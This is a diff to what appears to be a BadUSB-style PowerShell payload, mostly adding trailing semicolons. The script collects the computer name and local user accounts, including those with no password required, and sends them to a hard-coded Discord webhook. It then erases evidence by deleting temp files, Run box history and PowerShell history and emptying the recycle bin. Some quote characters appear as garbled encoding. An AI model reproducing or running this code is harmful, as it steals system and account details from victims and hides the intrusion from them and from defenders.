@@ -14,7 +14,7 @@
 
 
 $D="$env:tmp";
-cd $D\pass
+cd $D\pass;
 
 $FileName = "${Date}${env:computername}_${Time}.txt";
 
@@ -22,13 +22,13 @@ $FileName = "${Date}${env:computername}_${Time}.txt";
 
 $Date = Get-Date -Format yyyy-MM-dd;
 $Time = Get-Date -Format hh-mm-ss;
-dir env:
+dir env:;
 $env:computername | Out-File $FileName -Force;
-Add-Content -Path ì$FileNameî -Value ìComputer Info";
+Add-Content -Path ‚Äú$FileName‚Äù -Value ‚ÄúComputer Info";
 Get-LocalUser | Where-Object -Property PasswordRequired -Match false | Out-File $FileName -Append;
 Get-LocalUser | Out-File $FileName -Append;
 
-$args1 = Get-Content .\$FileName
+$args1 = Get-Content .\$FileName;
 
 $statOutput = $args1 | Out-String;
     $webhookUrl = 'https://discord.com/api/webhooks/1256048768206241803/BWYs2QrnsKznXQ9dSCCX4FJVvQvHKn9KpcvXFHJoKL5iWCRW_FWMravdB-8qJfslVn_n';
@@ -38,19 +38,19 @@ $statOutput = $args1 | Out-String;
     
 ########################################################################################################################################################################
 
-cd\
+cd\;
 # empty temp folder
-rm $D\pass* -r -Force -ErrorAction SilentlyContinue
+rm $D\pass* -r -Force -ErrorAction SilentlyContinue;
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;
 
 
 # delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f;
 
 # Delete powershell history
-Remove-Item (Get-PSreadlineOption).HistorySavePath
+Remove-Item (Get-PSreadlineOption).HistorySavePath;
 
 # Empty recycle bin
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue;
